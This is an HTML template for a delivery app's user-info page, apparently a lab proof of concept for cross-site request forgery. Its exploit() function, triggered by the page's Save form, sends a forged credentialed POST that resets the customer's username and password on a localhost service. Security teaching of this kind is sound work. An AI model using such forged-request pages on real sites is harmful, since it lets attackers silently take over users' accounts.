<!DOCTYPE html>
<html lang="en" xmlns:th="http://www.thymeleaf.org" xmlns:layout="http://www.ultraq.net.nz/thymeleaf/layout"
      layout:decorate="~{layout}" xmlns:sec="http://www.thymeleaf.org/extras/spring-security">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <!-- layout page -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
            integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>

    <!--    Bootstrap-->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
          integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <!--    Dark Cyborg-->
    <!--    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.4.1/cyborg/bootstrap.min.css">-->

    <!--    Darkly-->
    <!--    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.4.1/darkly/bootstrap.min.css">-->

    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
            integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
            crossorigin="anonymous"></script>
    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
    <!-- end layout page -->



    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
          integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
            integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
            crossorigin="anonymous"></script>

    <title>Deliveries</title>
    <script>
        function exploit() {
            const formData = new FormData();
            formData.append('id', 1);
            formData.append('username', 'BRUCEe');
            formData.append('password', 'WAYNEe');
            formData.append('csrfToken', 'WAYNEe');
            fetch('http://localhost:8080/api/customer/update-customer', {method: 'POST', credentials:'include', body: formData });

            location.replace("http://localhost:8080/customers-and-restaurants")

            return false;
        }

        function deleteCustomer(customerId) {
            fetch('/customer?id=' + customerId, {
                method: 'DELETE'
            }).then(function () {
                window.location.href = '/customers-and-restaurants';
            });
        }

        function deleteAddress(addressId) {
            fetch('/customer/address?id=' + addressId, {
                method: 'DELETE'
            }).then(function () {
                window.location.href = '';
            });
        }
    </script>
</head>
<body>
<!-- layout page -->
<header>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand" th:href="@{/}">Deliveries</a>
        <ul class="navbar-nav mr-auto">
            <li class="nav-item">
                <a class="nav-link" th:href="@{/order}">New Order</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" th:href="@{/customers-and-restaurants}">Users</a>
            </li>
        </ul>
        <ul class="navbar-nav ml-auto">
            <li class="nav-item">
                <a class="nav-link" href="/logout">Logout</a>
            </li>
        </ul>
    </nav>
</header>
<main class="container" layout:fragment="content">
    <p>
    <div layout:fragment="content">
        <h1>User info</h1>
        <div class="row">
            <form method="POST" onsubmit="return exploit()" class="col-5">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" name="username" class="form-control" id="username" value="bruce">
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="text" name="password" class="form-control" id="password" value="wayne">
                </div>
                <input type="hidden" name="id" class="form-control" id="id" value="1">
                <button class="btn btn-primary">Save</button>
            </form>
        </div>

        <div class="row">
            <div class="form-group">
                <button type="submit" class="btn btn-danger" id="deleteUser"
                        th:onclick="'deleteCustomer(\''+ ${customer.id} +'\')'">Delete
                </button>
            </div>
        </div>
        <h1>Addresses</h1>
        <table>
            <tr th:each="address: ${addresses}">
                <form method="POST" action="/api/customer/address/update-address" class="col-5">
                    <td><input name="name" th:value="${address.name}"/>
                        <input type="hidden" name="id" th:value="${address.id}"/></td>
                    <td>
                        <button class="btn btn-primary">Save</button>
                    </td>
                </form>
                <td>
                    <button class="btn btn-danger" th:onclick="'deleteAddress(\''+ ${address.id} +'\')'">Delete</button>
                </td>
            </tr>
        </table>
        <h1>Add new address</h1>
        <table>
            <form method="POST" action="/customer/address" class="col-5">
                <tr>
                    <td><input name="name"></td>
                    <input type="hidden" name="userId" th:value="${customer.id}"/></td>
                    <td>
                        <button class="btn btn-primary">Save</button>
                    </td>
                </tr>
            </form>
        </table>
    </div>
    </p>
</main>
<footer>
    <div class="footer-copyright text-center py-3">
        Â© 2021 Copyright: <a th:href="@{/}">Order Search</a>
    </div>
</footer>
<!-- end layout page -->


</body>